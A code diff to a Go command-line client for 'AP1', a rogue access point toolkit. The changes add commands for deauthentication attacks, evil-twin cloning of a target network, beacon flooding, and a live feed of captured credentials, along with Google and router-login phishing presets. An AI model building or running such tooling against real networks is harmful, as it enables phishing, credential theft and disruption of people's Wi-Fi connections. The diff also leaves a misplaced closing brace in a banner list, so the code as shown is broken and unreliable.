@@ -17,10 +17,12 @@ import (
 	"syscall"
 	"text/tabwriter"
 	"time"
+
+	"github.com/gorilla/websocket"
 )
 
 const (
-	defaultAPIBase = "http://127.0.0.1:8080"
+	defaultAPIBase = "http://127.0.0.1:8001"
 	buildVersion   = "0.1.0"
 	buildTagline   = "AP1 - edge-aware captive portal orchestrator"
 	ansiReset      = "\033[0m"
@@ -172,32 +174,38 @@ var currentModule = ""
 
 var banners = []string{
 	`
-  ____   ____  _   _ _____
- |  _ \ / ___|| | | | ____|
- | |_) | |  _ | | | |  _|
- |  __/| |_| || |_| | |___
- |_|    \____| \___/|_____|
+  .,'
+ .''.'
+ .' .'
+ _.ood0Pp._ ,'  `.~ .q?00doo._
+ .od00Pd0000Pdb._. . _:db?000b?000bo.
+ .?000Pd0000Pd0000PdbMb?00000b?000b?0000b.
+ .d0000Pd0000Pd0000Pd0000b?0000b?000b?0000b.
+ d0000Pd0000Pd00000Pd0000b?00000b?0000b?000b.
+ 00000Pd0000Pd0000Pd00000b?00000b?0000b?0000b
+ ?0000b?0000b?     AP1 CORE    00Pd0000Pd0000P
+ ?0000b?0000b?0000b?00000Pd00000Pd0000Pd000P
+ ` + "`" + `?0000b?0000b?0000b?0000Pd0000Pd0000Pd000P'
+ ` + "`" + `?000b?0000b?000b?0000Pd000Pd0000Pd000P
+ ` + "`" + `~?00b?000b?000b?000Pd00Pd000Pd00P'
+ ` + "`" + `~?0b?0b?000b?0Pd0Pd000PdP~'
 `,
 	`
-    ___   ____  ____  ______
-   / _ \ / ___||  _ \|  ____|
-  | | | | |  _ | |_) |  _|
-  | |_| | |_| ||  _ <| |___
-   \___/ \____||_| \_\_____|
+      _      _____  _
+     / \    |  __ \| |
+    / _ \   | |__) | |
+   / ___ \  |  ___/| |
+  /_/   \_\ |_|    |_|
+  ACCESS POINT ORCHESTRATOR
 `,
 	`
-   ___    ____  _   _ _____
-  / _ \  / ___|| | | | ____|
- | | | | \___ \| | | |  _|
- | |_| |  ___) | |_| | |___
-  \___/  |____/ \___/|_____|
-`,
-	`
-  ____   ____  _____  _   _
- |  _ \ / ___|| ____|| \ | |
- | |_) | |  _ |  _|  |  \| |
- |  _ <| |_| || |___ | |\  |
- |_| \_\\____||_____||_| \_|
+   ____  ____  _
+  / __ \|  _ \/ |
+ | |  | | |_) | |
+ | |  | |  __/| |
+ | |__| | |   | |
+  \____/|_|   |_|
+  THE ROGUE AP TOOLKIT
 `,
 }
 var startBanners = []string{
@@ -209,6 +217,15 @@ var startBanners = []string{
    _| |_| |_| |____) |_| |_| |\  | |_) |
   |_____|\___/|_____/|_____|_| \_|____/ 
 `,
+	`
+   █████╗ ██████╗  ██╗
+  ██╔══██╗██╔══██╗███║
+  ███████║██████╔╝╚██║
+  ██╔══██║██╔═══╝  ██║
+  ██║  ██║██║      ██║
+  ╚═╝  ╚═╝╚═╝      ╚═╝
+`,
+}
 	`
    _____ _   _ _____ _____  ______ _   _ 
   / ____| \ | |_   _/ ____|/ ____| \ | |
@@ -266,6 +283,11 @@ func doRequest(method, path string, body io.Reader) ([]byte, error) {
 	}
 	if body != nil {
 		req.Header.Set("Content-Type", "application/json")
+	}
+
+	token := os.Getenv("AP1_API_TOKEN")
+	if token != "" {
+		req.Header.Set("X-API-Token", token)
 	}
 
 	resp, err := http.DefaultClient.Do(req)
@@ -329,6 +351,10 @@ func getViaDocker(path string) ([]byte, error) {
 
 func doDockerRequest(method, path string, payload []byte) ([]byte, error) {
 	args := []string{"curl", "-sS", "-X", method, "-H", "Content-Type: application/json"}
+	token := os.Getenv("AP1_API_TOKEN")
+	if token != "" {
+		args = append(args, "-H", fmt.Sprintf("X-API-Token: %s", token))
+	}
 	if len(payload) > 0 {
 		args = append(args, "-d", string(payload))
 	}
@@ -522,7 +548,7 @@ func cmdAP(args []string) {
 }
 
 func cmdAPStatus() {
-	printSection("AP Status")
+	printSection("Settings AccessPoint")
 	b, err := get("/api/status")
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "error:", err)
@@ -533,30 +559,45 @@ func cmdAPStatus() {
 		fmt.Fprintln(os.Stderr, "failed to parse status response:", err)
 		os.Exit(1)
 	}
-	mainInfo := map[string]interface{}{
-		"service": status["service"],
-		"version": status["version"],
-	}
-	printKeyValues(mainInfo)
 
-	if cfg, ok := status["config"].(map[string]interface{}); ok {
-		printSection("Configuration")
-		printKeyValues(map[string]interface{}{
-			"name":           cfgValue(cfg, []string{"app", "name"}),
-			"environment":    cfgValue(cfg, []string{"app", "environment"}),
-			"api_url":        cfgValue(cfg, []string{"app", "api_url"}),
-			"core_url":       cfgValue(cfg, []string{"app", "core_url"}),
-			"interface":      cfgValue(cfg, []string{"network", "default_interface"}),
-			"portal_ip":      cfgValue(cfg, []string{"network", "portal_ip"}),
-			"dns_ip":         cfgValue(cfg, []string{"network", "dns_ip"}),
-			"captive_portal": cfgValue(cfg, []string{"network", "captive_portal"}),
-			"active_profile": cfgValue(cfg, []string{"active_profile"}),
-		})
+	cfg, ok := status["config"].(map[string]interface{})
+	if !ok {
+		fmt.Println("No configuration found")
+		return
 	}
-	if plugins, ok := status["plugins"].([]interface{}); ok {
-		printSection("Plugins")
-		fmt.Printf("  Enabled: %d\n\n", len(plugins))
+
+	iface := fmt.Sprint(cfgValue(cfg, []string{"network", "default_interface"}))
+	portalIP := fmt.Sprint(cfgValue(cfg, []string{"network", "portal_ip"}))
+	activeProfile := fmt.Sprint(cfg["active_profile"])
+	ssid := "<none>"
+	channel := "<none>"
+	security := "false"
+
+	if profiles, ok := cfg["profiles"].([]interface{}); ok {
+		for _, p := range profiles {
+			if profile, ok := p.(map[string]interface{}); ok {
+				if fmt.Sprint(profile["name"]) == activeProfile {
+					ssid = fmt.Sprint(profile["ssid"])
+					channel = fmt.Sprint(profile["channel"])
+					if sec := profile["security"]; sec != nil && sec != "open" {
+						security = "true"
+					}
+				}
+			}
+		}
 	}
+
+	apRunning := "not Running"
+	// Check if AP is running by looking for hostapd process
+	if pid, s := findServiceProcess("hostapd"); s == "running" {
+		apRunning = "Running (PID " + pid + ")"
+	}
+
+	rows := [][]string{
+		{"BSSID", "SSID", "CHANNEL", "INTERFACE", "INTERFACE_NET", "STATUS", "SECURITY"},
+		{"<auto>", ssid, channel, iface, portalIP, apRunning, security},
+	}
+	printTable(rows[0], rows[1:])
 }
 
 func cfgValue(cfg map[string]interface{}, path []string) interface{} {
@@ -616,15 +657,11 @@ func cmdStart(args []string) {
 
 func cmdStop(args []string) {
 	printSection("Stop AP")
-	fmt.Println(colorText(ansiYellow, "Stopping AP and captive portal..."))
-	if _, err := post("/api/portal/stop", nil); err != nil {
-		fmt.Fprintln(os.Stderr, "portal stop failed:", err)
-	}
-	if _, err := post("/api/system/hostapd/stop", nil); err != nil {
-		fmt.Fprintln(os.Stderr, "hostapd stop failed:", err)
-	}
-	if _, err := post("/api/system/dnsmasq/stop", nil); err != nil {
-		fmt.Fprintln(os.Stderr, "dnsmasq stop failed:", err)
+	fmt.Println(colorText(ansiYellow, "Stopping AP and all services..."))
+	if b, err := post("/api/portal/stop", nil); err != nil {
+		fmt.Fprintln(os.Stderr, "stop failed:", err)
+	} else {
+		printResponse(b)
 	}
 }
 
@@ -637,6 +674,36 @@ func cmdSet(args []string) {
 	value := strings.Join(args[1:], " ")
 
 	switch key {
+	case "interface":
+		payload := fmt.Sprintf(`{"interface":"%s"}`, value)
+		b, err := post("/api/config/set_interface", strings.NewReader(payload))
+		if err != nil {
+			fmt.Fprintln(os.Stderr, "failed to set interface:", err)
+			return
+		}
+		printResponse(b)
+		return
+	case "ssid", "channel", "password", "security":
+		var val interface{}
+		if key == "channel" {
+			ch, err := strconv.Atoi(value)
+			if err != nil {
+				fmt.Fprintln(os.Stderr, "invalid channel number")
+				return
+			}
+			val = ch
+		} else {
+			val = value
+		}
+		payload := map[string]interface{}{key: val}
+		data, _ := json.Marshal(payload)
+		b, err := post("/api/config/update", bytes.NewReader(data))
+		if err != nil {
+			fmt.Fprintln(os.Stderr, "failed to set "+key+":", err)
+			return
+		}
+		printResponse(b)
+		return
 	case "api":
 		apiBase = value
 		runtimeSettings["api"] = value
@@ -651,6 +718,26 @@ func cmdSet(args []string) {
 
 	runtimeSettings[key] = value
 	fmt.Printf("%s set to %s\n", key, value)
+}
+
+func cmdPresets(args []string) {
+	if len(args) == 0 {
+		fmt.Println("available presets:")
+		fmt.Println("  open_nav      - Open AP with real internet and sniffing")
+		fmt.Println("  google_phish  - AP with Google phishing template")
+		fmt.Println("  router_attack - AP with Router Login template")
+		fmt.Println("\nusage: presets <name>")
+		return
+	}
+
+	name := args[0]
+	payload := fmt.Sprintf(`{"name":"%s"}`, name)
+	b, err := post("/api/config/preset", strings.NewReader(payload))
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "failed to apply preset:", err)
+		return
+	}
+	printResponse(b)
 }
 
 func cmdUnset(args []string) {
@@ -1452,7 +1539,14 @@ func showBanner(mode string) {
 	default:
 		banner = randomBanner()
 	}
-	fmt.Println(colorText(ansiCyan, banner))
+
+	// Animation effect: Typewriter/Fade-in
+	lines := strings.Split(banner, "\n")
+	for _, line := range lines {
+		fmt.Println(colorText(ansiCyan, line))
+		time.Sleep(20 * time.Millisecond)
+	}
+
 	var tagline string
 	if mode == "start" {
 		tagline = "starting AP1..."
@@ -1462,72 +1556,200 @@ func showBanner(mode string) {
 		tagline = randomTagline()
 	}
 	fmt.Println(colorText(ansiGreen, ansiBold+"AP1 - "+tagline+ansiReset))
+	fmt.Println()
+}
+
+func cmdExit() {
+	fmt.Println()
+	fmt.Println(colorText(ansiYellow, "[!] Exiting AP1 CLI..."))
+
+	// Closing animation
+	chars := []string{"|", "/", "-", "\\"}
+	for i := 0; i < 10; i++ {
+		fmt.Printf("\r%s Cleaning up session... %s", colorText(ansiCyan, chars[i%len(chars)]), colorText(ansiCyan, chars[i%len(chars)]))
+		time.Sleep(100 * time.Millisecond)
+	}
+	fmt.Println("\r" + colorText(ansiGreen, "[+] Session closed. Happy hunting!"))
+	fmt.Println()
+	os.Exit(0)
 }
 
 func usage() {
 	showBanner("")
-	fmt.Println(colorText(ansiYellow, "Usage:"))
-	fmt.Println("  ap1-cli [--api URL] <command> [args...]")
+	fmt.Println(colorText(ansiYellow, "[*] Available Commands:"))
+	fmt.Println("=======================")
 	fmt.Println()
-	fmt.Println(colorText(ansiYellow, "Core commands:"))
-	fmt.Println("  help                         Show this help")
-	fmt.Println("  status                       Show API/core status")
-	fmt.Println("  health                       Check API health endpoint")
-	fmt.Println("  config                       Dump current loaded config")
-	fmt.Println("  version                      Show CLI version")
-	fmt.Println("  banner                       Show a random AP1 banner")
-	fmt.Println("  clear                        Clear the terminal and show a new banner")
-	fmt.Println("  clients                      Show connected clients")
+
+	fmt.Println(colorText(ansiCyan, "Core Commands:"))
+	fmt.Println("==============")
+	fmt.Printf("%-12s %s\n", "Command", "Description")
+	fmt.Printf("%-12s %s\n", "-------", "-----------")
+	printCmd("banner", "display an awesome AP1 banner")
+	printCmd("clear", "clear the terminal and show a new banner")
+	printCmd("exit", "exit program and all threads")
+	printCmd("help", "show this help")
+	printCmd("ignore", "the message logger will be ignored")
+	printCmd("info", "get information about proxy/plugin settings")
+	printCmd("jobs", "show all threads/processes in background")
+	printCmd("search", "search modules by name")
+	printCmd("set", "set variable proxy,plugin and access point")
+	printCmd("presets", "apply a predefined attack scenario")
+	printCmd("show", "show available modules")
 	fmt.Println()
-	fmt.Println(colorText(ansiYellow, "AP management:"))
-	fmt.Println("  ap [status|start|stop]       Manage the access point")
-	fmt.Println("  start                        Start AP, services and portal")
-	fmt.Println("  stop                         Stop AP, services and portal")
-	fmt.Println("  profiles list                List all AP profiles")
-	fmt.Println("  profiles select <name>       Activate a profile")
-	fmt.Println("  profiles create <name> <ssid> <password> <channel> <mode> <dhcp>")
-	fmt.Println("  profiles update <name> <ssid> <password> <channel> <mode> <dhcp>")
-	fmt.Println("  profiles delete <name>       Remove a profile")
+
+	fmt.Println(colorText(ansiYellow, "Presets:"))
+	fmt.Println("  open_nav      - Open AP with real internet and sniffing")
+	fmt.Println("  google_phish  - AP with Google phishing template")
+	fmt.Println("  router_attack - AP with Router Login template")
 	fmt.Println()
-	fmt.Println(colorText(ansiYellow, "Proxy / plugin / session:"))
-	fmt.Println("  set <key> <value>            Set runtime configuration")
-	fmt.Println("  unset <key>                  Unset runtime configuration")
-	fmt.Println("  ignore <component>           Ignore log output for a component")
-	fmt.Println("  restore <component>          Restore log output for a component")
-	fmt.Println("  info <proxy|plugin>          Show proxy/plugin info")
-	fmt.Println("  jobs                         Show background jobs")
-	fmt.Println("  mode [set <static|docker>]   Show or set wireless mode")
-	fmt.Println("  plugins list                 List plugins")
-	fmt.Println("  plugins toggle <name> <on|off>")
-	fmt.Println("  plugins start <name> <cmd> [args...]")
-	fmt.Println("  plugins stop <name>")
-	fmt.Println("  proxies [list]               List supported proxy backends")
-	fmt.Println("  show <modules|plugins|proxies|commands>")
-	fmt.Println("  search <term>                Search available CLI commands")
-	fmt.Println("  use <module>                 Select a module")
-	fmt.Println("  dump credentials             Dump captured portal credentials")
-	fmt.Println("  banner                       Show a random AP1 banner")
-	fmt.Println("  clear                        Clear the terminal and show a new banner")
-	fmt.Println("  dhcpconf                     DHCP server configuration helpers")
-	fmt.Println("  dhcpmode                     DHCP mode helpers")
-	fmt.Println("  update                       Deprecated update command")
+	printCmd("unset", "unset variable command")
+	printCmd("use", "select module for modules")
+	printCmd("status", "show API/core status")
 	fmt.Println()
-	fmt.Println(colorText(ansiYellow, "Network / portal:"))
-	fmt.Println("  portal status                Show captive portal status")
-	fmt.Println("  portal credentials           Show captured portal credentials")
-	fmt.Println("  portal start                 Start the captive portal server")
-	fmt.Println("  portal stop                  Stop the captive portal server")
-	fmt.Println("  templates list               List available portal templates")
-	fmt.Println("  templates import <src_dir>   Import templates from another repo")
-	fmt.Println("  firewall apply [iface] [portal_ip]  Apply captive portal firewall rules")
-	fmt.Println("  firewall clear [iface]            Clear captive portal firewall rules")
-	fmt.Println("  interface configure <iface> <ip> <subnet>  Configure a network interface")
-	fmt.Println("  system <service> <action>    Manage hostapd/dnsmasq")
-	fmt.Println("  recon scan [iface]           Scan Wi-Fi networks on iface")
+
+	fmt.Println(colorText(ansiCyan, "Ap Commands:"))
+	fmt.Println("============")
+	fmt.Printf("%-12s %s\n", "Command", "Description")
+	fmt.Printf("%-12s %s\n", "-------", "-----------")
+	printCmd("ap", "show all variable and status from AP")
+	printCmd("clients", "show all connected clients on AP")
+	printCmd("dhcpconf", "show/choice dhcp server configuration")
+	printCmd("dhcpmode", "show/set all available dhcp server")
+	printCmd("dump", "dump informations from client connected on AP")
+	printCmd("start", "start access point service")
+	printCmd("stop", "stop access point service")
+	printCmd("profiles", "manage AP profiles (list, select, create, delete)")
 	fmt.Println()
+
+	fmt.Println(colorText(ansiCyan, "Network Commands:"))
+	fmt.Println("=================")
+	fmt.Printf("%-12s %s\n", "Command", "Description")
+	fmt.Printf("%-12s %s\n", "-------", "-----------")
+	printCmd("plugins", "show all available plugins")
+	printCmd("proxies", "show all available proxies")
+	printCmd("deauth", "perform deauthentication attack")
+	printCmd("eviltwin", "automatic evil twin attack (scan & clone)")
+	printCmd("beacon", "beacon flooding attack (create fake SSIDs)")
+	printCmd("monitor", "real-time credential monitoring")
+	printCmd("recon", "scan for wireless networks")
+	printCmd("firewall", "manage firewall rules")
+	printCmd("portal", "manage captive portal")
+	printCmd("interface", "configure network interfaces")
+	fmt.Println()
+
 	fmt.Println(colorText(ansiYellow, "Environment:"))
 	fmt.Println("  AP1_API_URL                 API server URL")
+	fmt.Println("  AP1_API_TOKEN               API authentication token")
 	fmt.Println("  AP1_USE_DOCKER              Use docker compose exec for requests")
+}
+
+func printCmd(cmd, desc string) {
+	fmt.Printf("%-12s %s\n", cmd, desc)
+}
+
+func cmdDeauth(args []string) {
+	if len(args) < 2 {
+		fmt.Println("deauth: usage: deauth <interface> <bssid> [client_mac] [count]")
+		return
+	}
+	iface := args[0]
+	bssid := args[1]
+	payload := map[string]interface{}{
+		"interface": iface,
+		"bssid":     bssid,
+	}
+	if len(args) >= 3 {
+		payload["client"] = args[2]
+	}
+	if len(args) >= 4 {
+		count, err := strconv.Atoi(args[3])
+		if err == nil {
+			payload["count"] = count
+		}
+	}
+
+	data, _ := json.Marshal(payload)
+	b, err := post("/api/deauth/start", bytes.NewReader(data))
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "deauth failed:", err)
+		return
+	}
+	printResponse(b)
+}
+
+func cmdEvilTwin(args []string) {
+	if len(args) < 2 {
+		fmt.Println("eviltwin: usage: eviltwin <interface> <target_ssid>")
+		return
+	}
+	iface := args[0]
+	ssid := args[1]
+	payload := map[string]interface{}{
+		"interface": iface,
+		"ssid":      ssid,
+	}
+	data, _ := json.Marshal(payload)
+	b, err := post("/api/eviltwin/start", bytes.NewReader(data))
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "evil twin failed:", err)
+		return
+	}
+	printResponse(b)
+}
+
+func cmdBeacon(args []string) {
+	if len(args) < 2 {
+		fmt.Println("beacon: usage: beacon <interface> <ssid1> [ssid2...]")
+		fmt.Println("        beacon stop")
+		return
+	}
+
+	if args[0] == "stop" {
+		b, err := post("/api/beacon/stop", nil)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, "beacon stop failed:", err)
+			return
+		}
+		printResponse(b)
+		return
+	}
+
+	iface := args[0]
+	ssids := args[1:]
+	payload := map[string]interface{}{
+		"interface": iface,
+		"ssids":     ssids,
+	}
+	data, _ := json.Marshal(payload)
+	b, err := post("/api/beacon/start", bytes.NewReader(data))
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "beacon flood failed:", err)
+		return
+	}
+	printResponse(b)
+}
+
+func cmdMonitor(args []string) {
+	printSection("Live Credential Monitor")
+	fmt.Println("Press Ctrl+C to exit monitor mode")
+	fmt.Println(strings.Repeat("-", 40))
+
+	wsURL := strings.Replace(apiBase, "http", "ws", 1) + "/ws/credentials"
+	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "dial error:", err)
+		return
+	}
+	defer c.Close()
+
+	for {
+		_, message, err := c.ReadMessage()
+		if err != nil {
+			fmt.Fprintln(os.Stderr, "read error:", err)
+			return
+		}
+		fmt.Printf("[%s] %s\n", colorText(ansiGreen, "NEW CREDENTIAL"), string(message))
+	}
 }
 
 func main() {
@@ -1545,20 +1767,22 @@ func main() {
 	}
 	dockerMode = dockerFlag || (isDockerComposeAvailable() && os.Getenv("AP1_USE_DOCKER") == "1")
 
-	if os.Geteuid() != 0 {
+	cmd := flag.Arg(0)
+	if cmd == "" {
+		usage()
+		os.Exit(0)
+	}
+
+	if os.Geteuid() != 0 && cmd != "help" && cmd != "version" && cmd != "banner" {
 		fmt.Fprintln(os.Stderr, "ERROR: AP1 CLI must be run as root.")
 		fmt.Fprintln(os.Stderr, "Please run with sudo: sudo ap1-cli <command>")
 		os.Exit(1)
 	}
 
-	if flag.NArg() == 0 {
-		usage()
-		os.Exit(0)
-	}
-
-	cmd := flag.Arg(0)
 	args := flag.Args()[1:]
 	switch cmd {
+	case "exit", "quit":
+		cmdExit()
 	case "status":
 		cmdStatus()
 	case "health":
@@ -1575,6 +1799,8 @@ func main() {
 		cmdAP(args)
 	case "set":
 		cmdSet(args)
+	case "presets":
+		cmdPresets(args)
 	case "unset":
 		cmdUnset(args)
 	case "ignore":
@@ -1621,6 +1847,14 @@ func main() {
 		cmdInterface(args)
 	case "system":
 		cmdSystem(args)
+	case "deauth":
+		cmdDeauth(args)
+	case "eviltwin":
+		cmdEvilTwin(args)
+	case "beacon":
+		cmdBeacon(args)
+	case "monitor":
+		cmdMonitor(args)
 	case "templates":
 		cmdTemplates(args)
 	case "version":
